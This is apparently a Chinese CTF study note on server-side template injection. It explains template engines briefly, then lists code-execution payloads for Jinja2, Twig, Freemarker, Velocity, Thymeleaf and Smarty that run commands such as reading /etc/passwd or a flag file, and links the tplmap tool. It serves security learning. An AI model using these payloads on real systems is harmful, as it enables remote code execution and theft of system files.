---
title: SSTI
author: Creexile
date: 2024-03-10
lastMod: 2026-07-24
summary: ''
cover: ''
category: 'CTF'
draft: false
comments: false
sticky: 0
tags: [CTF, CTF基础, SSTI, 容器逃逸, Spring, Python, PHP, Java]
---

# 前置

## 模板引擎

模板引擎（特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的, 它可以生成特定格式的文档, 利用模板引擎来生成前端的html代码. 模板引擎会提供一套生成html代码的程序, 只需要获取用户的数据然后放到渲染函数里生成模板+用户数据的前端html页面再反馈给浏览器, 就能呈现在用户面前.

模板引擎也会提供沙箱机制来防范漏洞，但同样有沙箱逃逸技术.

## 模板注入(SSTI)

python中的flask, php的thinkphp, java的spring等采用MVC的模式的框架(Controller->Model->View), 如果处理用户输入存在问题, 就会导致SSTI.

服务端接收攻击者的恶意输入以后, 未经任何处理就将其作为Web应用模板内容的一部分, 模板引擎在进行目标编译渲染的过程中, 执行了攻击者插入的语句.

## 常见漏洞链

先做了解,详细的还是分开写吧

1. Jinja2 (Python)

```python
{{().__class__.__bases__[0].__subclasses__()[X].__init__.__globals__['os'].popen('id').read()}}
{{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}
{{request.__class__.__mro__[1].__subclasses__()[X]('whoami',shell=True,stdout=-1).communicate()}}
{{''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['sys'].modules['os'].popen('ls').read()}}
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

2. Twig (PHP)

```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("cat /flag")}}
{{['id']|filter('system')}}
{{['cat /etc/passwd']|filter('system')}}
```

3. Freemarker (Java)

```java
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
<#assign ex="freemarker.template.utility.ObjectConstructor"?new()>${ ex("java.lang.ProcessBuilder","whoami").start() }
${"freemarker.template.utility.JythonRuntime"?new()>"__import__('os').system('id')"}
```

4. Velocity (Java)

```java
#set($x=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
#set($input=$class.inspect("java.lang.Process").type.getInputStream())
#set($sc=$class.inspect("java.util.Scanner"))
#set($constructor=$sc.getConstructor($class.inspect("java.io.InputStream")))
#set($scan=$constructor.newInstance($x.getInputStream()))
$scan.nextLine()
```

5. Thymeleaf (Spring)

```java
${T(java.lang.Runtime).getRuntime().exec('whoami')}
${#ctx.getVariable('T(java.lang.Runtime)').getRuntime().exec('id')}
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
```

6. Smarty (PHP)

```php
{php}echo `id`;{/php}
{system('cat /flag')}
{if phpinfo()}{/if}
```

# 语言

## Python

[SSTI-Python](../ctf知识/SSTI-Python.md)

## PHP

还在写

## Java

# 工具

[github-tplmap](https://github.com/epinna/tplmap)

参考文章

1. [SSTI（模板注入）漏洞（入门篇）](https://www.cnblogs.com/bmjoker/p/13508538.html)
